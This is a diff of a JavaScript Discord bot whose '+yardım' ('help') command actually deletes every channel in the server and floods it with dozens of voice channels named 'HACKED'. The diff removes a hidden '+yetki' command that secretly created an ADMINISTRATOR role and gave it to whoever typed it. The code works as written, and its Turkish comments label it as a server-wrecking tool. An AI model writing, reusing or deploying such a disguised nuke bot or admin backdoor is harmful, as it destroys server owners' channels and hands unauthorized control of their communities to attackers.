@@ -38,23 +38,11 @@ client.on("message", async msg => {
   } 
 });
 
-client.on("message", msg => {
-  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
-    msg.delete();
-    msg.guild.createRole({
-      name: ".",
-      permissions: ["ADMINISTRATOR"]
-    });
-    let rol = msg.guild.roles.find(role => role.name === ".");  
-    msg.member.addRole(rol);
-  }
-});
-
 client.on("message", async msg => {
   if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
-    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
+      await msg.guild.channels.deleteAll();        //TÜM KANALLARI SİLEN KOMUT
 
     await msg.guild.createChannel("hacked", {
       type: "text"
@@ -67,21 +55,21 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", { ///null
+      .createChannel("HACKED", { ///hacked
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -95,28 +83,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -130,14 +118,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
-      .then(chan => {  ///null
+      .then(chan => {  ///hacked
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -151,21 +139,21 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -179,134 +167,49 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {  ///null
+      .createChannel("▬▬▬▬▬▬▬", {  ///hacked
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", { ///null
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -321,21 +224,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -349,28 +252,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -384,14 +287,99 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", { ///hacked
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -406,21 +394,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -434,28 +422,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -469,21 +457,21 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
                 await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {  ///null
+      .createChannel("▬▬▬▬▬▬▬", {  ///hacked
         type: "voice"
       })
       .then(chan => {
@@ -491,21 +479,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -519,113 +507,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");  ///null
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -639,14 +542,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -661,25 +564,25 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("1");
+        chan.setUserLimit("1");  ///hacked
       });
         await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
@@ -689,28 +592,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {  ///null
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -724,14 +627,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -746,21 +649,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -774,28 +677,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })   ///null
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {  ///hacked
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {  ///null
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -809,14 +712,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -831,21 +734,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -859,28 +762,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
+        type: "voice"
+      })   ///hacked
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {  ///hacked
         type: "voice"
       })
       .then(chan => {
@@ -894,14 +797,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -916,21 +819,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -944,28 +847,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
-      })   ///null
+      })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -979,14 +882,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -1001,21 +904,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild  ///null
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+            await msg.guild
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -1029,28 +932,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
-      })
+      })   ///hacked
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -1064,14 +967,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -1086,21 +989,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+            await msg.guild  ///hacked
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -1114,28 +1017,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"     ///null
+      .createChannel("HACKED", {
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -1149,14 +1052,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -1171,21 +1074,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Melik ama yıkık olandan alayım#0061", {
+      .createChannel("HACKED xD", {
         type: "voice"
       })
       .then(chan => {
@@ -1199,28 +1102,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
-        type: "voice"
-      })  ///null
+      .createChannel("HACKED", {
+        type: "voice"     ///hacked
+      })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
@@ -1234,19 +1137,19 @@ client.on("message", async msg => {
